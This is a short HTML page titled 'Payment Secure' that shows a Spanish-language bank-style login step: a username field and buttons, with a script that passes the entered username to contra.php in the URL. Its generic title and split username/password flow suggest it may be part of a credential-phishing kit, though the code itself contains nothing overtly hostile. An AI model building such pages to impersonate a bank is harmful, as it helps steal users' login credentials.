<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Secure</title>
    
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">

    <style>
        body {
            font-family: Arial, Helvetica, sans-serif;
        }
        input {
            width: 80%;
            border: none;
            border-bottom: 1px solid #dcdcdc;
            height: 40px;
            font-size: 15px;
            margin-bottom: 20px;
        }
        input[type="button"] {
            border: 0;
            width: 80%;
            background-color: #f08ba7;
            height: 40px;
            border-radius: 20px;
            color: white;
            font-size: 15px;
            cursor: pointer;
        }
        input[type="button"]:nth-child(3) {
            background-color: white;
            color: #f08ba7;
            border: 1px solid #f08ba7;
        }
    </style>
</head>
<body>

<img src="img/logo.jpg" alt="Logo" width="100%">

<div style="text-align: center; margin-top: 20px;">
    <input type="text" id="txtUsuario" placeholder="Ingresa el usuario" required>
    <a href="#" style="position: absolute; right: 30px; margin-top: -30px; font-size: 14px;">¿Olvidaste tu usuario?</a>

    <input type="button" value="Continuar" id="btnUsuario">
</div>

<center>
    <input type="button" value="Registrarme ahora">
</center>

<script>
    document.getElementById('btnUsuario').addEventListener('click', function() {
        const usuario = document.getElementById('txtUsuario').value.trim();
        if (usuario.length > 0) {
            // Redirigir a contra.php con el usuario en la URL
            window.location.href = `contra.php?user=${encodeURIComponent(usuario)}`;
        } else {
            alert('Por favor, ingrese un usuario válido.');
        }
    });
</script>

</body>
</html>
